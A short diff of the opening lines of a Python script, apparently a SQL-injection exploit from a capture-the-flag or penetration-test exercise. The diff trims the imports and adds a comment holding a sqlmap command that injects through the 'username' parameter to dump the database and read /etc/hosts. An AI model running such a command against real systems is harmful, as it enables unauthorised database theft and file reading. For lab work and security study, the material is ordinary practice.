@@ -1,6 +1,8 @@
 #!/usr/bin/env python3 
 
-import sys, signal, requests, string, time
+# Extract with sqlmap: sqlmap -r req.txt -p username --risk 3 --level 3 --batch --dump (--file-read=/etc/hosts)
+
+import sys, signal, requests  
 
 def def_handler(sig, frame):
     print("\n[!] Exiting...\n")
